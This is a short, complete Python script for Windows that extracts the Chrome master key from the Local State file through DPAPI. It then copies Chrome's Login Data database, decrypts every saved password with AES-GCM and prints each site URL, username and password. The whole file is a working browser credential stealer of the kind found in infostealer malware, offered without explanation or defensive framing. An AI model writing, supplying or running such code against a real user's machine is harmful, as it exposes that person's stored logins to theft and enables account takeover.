import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def getEncryptionKey():
    localStatePath = os.path.join(os.environ["USERPROFILE"], 
        "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
    
    with open(localStatePath, "r", encoding="utf-8") as f:
        localState = json.loads(f.read())

    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decryptPassword(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = getEncryptionKey()
    dbPath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(dbPath, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
    
    for row in cursor.fetchall():
        originUrl = row[0]
        actionUrl = row[1]
        username = row[2]
        password = decryptPassword(row[3], key)
        if username or password:
            print(f"URL: {originUrl}")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print("=" * 50)
    
    cursor.close()
    db.close()
    os.remove(filename)

if __name__ == "__main__":
    main()
